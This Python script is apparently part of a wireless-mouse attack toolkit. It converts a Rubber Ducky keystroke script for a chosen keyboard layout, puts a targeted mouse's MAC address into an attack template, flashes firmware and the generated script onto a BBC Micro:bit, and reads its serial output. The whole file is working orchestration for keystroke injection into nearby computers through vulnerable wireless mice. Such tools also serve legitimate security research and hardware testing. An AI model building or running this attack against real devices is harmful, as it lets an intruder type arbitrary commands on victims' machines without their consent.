#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os
import sys
import select
import serial
import subprocess

from lib.rubber_ducky import generate_script
from lib import keymap

from optparse import OptionParser
from optparse import OptionGroup

import logging


"""
    The script opens the template file (wireless-mice-attack.template.py) and inject the correct
    values.
    The script injects the firmware and files on the Micro:Bit then read the output.
"""

WIRELESS_MICE_ATTACK_TEMP_SCRIPT = 'wireless-mice-attack.temp.py'

def get_logger():
    logger = logging.getLogger("wireless-mice-esb")

    logger_handler = logging.StreamHandler(sys.stdout)
    logger_formater = logging.Formatter("\r[%(asctime)s] [%(levelname)s] %(message)s", "%H:%M:%S")

    logger_handler.setFormatter(logger_formater)
    logger.addHandler(logger_handler)
    logger.setLevel(logging.DEBUG)

    return logger

logger = get_logger()

def update_firmware(firmware_path, script_path):
    """
        (venv)$ uflash -r precompiled/radiobit-esb.hex examples/wireless-mice/wireless-mice-attack.py
    """

    args = ['uflash', '-r', firmware_path, script_path]
    subprocess.call(args)

def generate_attack_script(attack_script_template_path, keystrokes, mice_mac_address):
    mice_mac_address = '[ 0x' + ', 0x'.join(mice_mac_address.split(':')) + ' ]'

    with open(attack_script_template_path, 'r') as fr:
        script = fr.read()
        script = script.format(
            mice_mac=mice_mac_address,
            keystrokes=keystrokes)

        with open(WIRELESS_MICE_ATTACK_TEMP_SCRIPT, 'w') as fw:
            fw.write(script)

    return WIRELESS_MICE_ATTACK_TEMP_SCRIPT


def start_serial(device, baudrate=115200, timeout=1, chunk_size=1):
    try:
        dev = serial.Serial(device, baudrate, timeout=timeout)
    except serial.serialutil.SerialException as e:
        logger.critical('An exception occurend while connecting to the Micro:bit')
        logger.critical(e.message)
        return

    logger.info("Start session with Micro:Bit on {device}".format(device=device))

    try:
        while True:
            s = dev.read(chunk_size)
            sys.stdout.write(s)
    except KeyboardInterrupt as error:
        logger.info('\033[1mTerminating sniffing ...\033[0m')
        dev.close()
    except serial.serialutil.SerialException as error:
        logger.info('\033[91mDevice not found (%s)\033[0m' % device)


def cmd_line_parser():
    parser = OptionParser()

    target = OptionGroup(parser, 'Target', '')
    target.add_option('-m', '--mice-mac', dest='mice_mac', help='Targeted mice MAC address')

    microbit = OptionGroup(parser, 'Micro:bit', 'Micro:bit informations')
    microbit.add_option('-d', '--device', dest='device', default='COM4', help='Micro:Bit device serial name')
    microbit.add_option('-b', '--baudrate', dest='baudrate', default=115200, help='Micro:Bit device baudrate')
    microbit.add_option('-f', '--firmware', dest='firmware', default='firmware/microbit-micropython-esb.hex', help='Micro:Bit firmware location')
    microbit.add_option('-s', '--script', dest='script', help="Python template file to start on Micro:Bit")

    rubber_ducky = OptionGroup(parser, 'Rubber Ducky', 'Rubber Ducky arguments')
    rubber_ducky.add_option('-k', '--keystrokes', dest='keystrokes_script', help='Input ducky script file')
    rubber_ducky.add_option('-l', '--layout', dest='layout', default='fr', help="Keyboard layout: %s" % ", ".join(keymap.mapping.keys()))

    parser.add_option_group(target)
    parser.add_option_group(microbit)
    parser.add_option_group(rubber_ducky)

    args, _ = parser.parse_args()

    return args


def main():
    args = cmd_line_parser()
    logger.debug(args)

    # converts rubber ducky script to keystrokes
    keystrokes = generate_script(args.keystrokes_script, args.layout)
    logger.debug('Keystrokes:')
    for l in keystrokes.split('\n'): logger.debug(l)

    # generates the python script to execute on the Micro:Bit
    python_script_path = generate_attack_script(args.script, keystrokes, args.mice_mac)

    # update the Micro:Bit and starts the script
    update_firmware(args.firmware, python_script_path)

    # read script output
    start_serial(args.device, args.baudrate)


if __name__ == '__main__':
    main()